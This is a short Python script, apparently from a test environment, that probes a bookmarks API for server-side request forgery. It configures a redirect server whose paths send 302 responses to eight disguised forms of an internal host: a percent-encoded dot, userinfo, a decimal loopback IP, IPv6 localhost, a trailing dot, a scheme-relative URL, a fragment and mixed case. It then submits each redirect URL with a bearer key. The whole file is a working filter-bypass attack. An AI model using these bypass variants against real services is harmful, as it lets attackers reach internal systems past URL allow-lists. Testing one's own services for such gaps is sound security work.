import json,urllib.request
admin='http://origin:8090/_admin/rules'; base='http://target-service:3000/api/v1/bookmarks'
key=json.load(open('/testbed/key-response.json'))['result']['data']['json']['key']; token='[REDACTED]'
variants=[('percent-host','http://artifact%2einternal:9000/'),('userinfo','http://mysite.public:8080@artifact.internal:9000/'),('numeric','http://2130706433:9000/'),('ipv6-local','http://[::1]:9000/'),('dot-host','http://artifact.internal.:9000/'),('scheme-relative','//artifact.internal:9000/'),('fragment','http://artifact.internal:9000/#public'),('mixed-case','http://ARTIFACT.INTERNAL:9000/')]
rules=[{'when':{'path':'/var-'+label},'reply':{'status':302,'location':loc}} for label,loc in variants]+[{'when':{},'reply':{'body':'page'}}]
def post(url,payload,headers):
 r=urllib.request.Request(url,data=json.dumps(payload).encode(),headers={'Content-Type':'application/json',**headers});
 try:
  with urllib.request.urlopen(r,timeout=5) as response:return response.status,json.load(response)
 except Exception as e:return None,str(e)
print('rules:',post(admin,{'rules':rules},{'X-Admin-Token':token}))
for label,_ in variants:
 url='http://mysite.public:8080/var-'+label
 status,resp=post(base,{'type':'link','url':url},{'Authorization':'Bearer '+key})
 print(label,status,resp.get('id') if isinstance(resp,dict) else resp,flush=True)
